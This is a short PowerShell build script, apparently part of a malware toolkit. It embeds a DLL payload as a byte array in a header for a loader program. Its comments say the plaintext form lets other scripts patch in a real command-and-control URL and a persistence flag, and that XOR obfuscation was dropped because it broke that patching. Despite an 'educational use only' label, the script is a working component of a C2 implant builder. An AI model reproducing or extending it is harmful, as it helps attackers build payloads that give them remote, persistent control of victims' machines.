# gen.ps1 -- converts ckdll.dll into src/payload.h (byte array for loader.cpp)
# EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
#
# The DLL bytes are embedded as plaintext so that auto.py/pick.py can find
# the C2 sentinel ("CKC2_DEADBEEF_") and persistence sentinel ("CKPR____")
# in loader.exe and patch them with the real C2 URL / persist flag.
#
# XOR encryption was removed because it made the sentinels unfindable,
# breaking C2 URL patching — the payload fell back to drop.json instead of HTTP.
$b = [IO.File]::ReadAllBytes("$PSScriptRoot\..\bin\ckdll.dll")
$s = ($b | ForEach-Object { "0x{0:x2}" -f $_ }) -join ","
Set-Content -Encoding ascii "$PSScriptRoot\payload.h" `
  "#pragma once`nstatic unsigned char g_payload[] = {$s};`nstatic unsigned g_payload_len = $($b.Length);`n#define PAYLOAD_ENTRY `"payload_entry`""
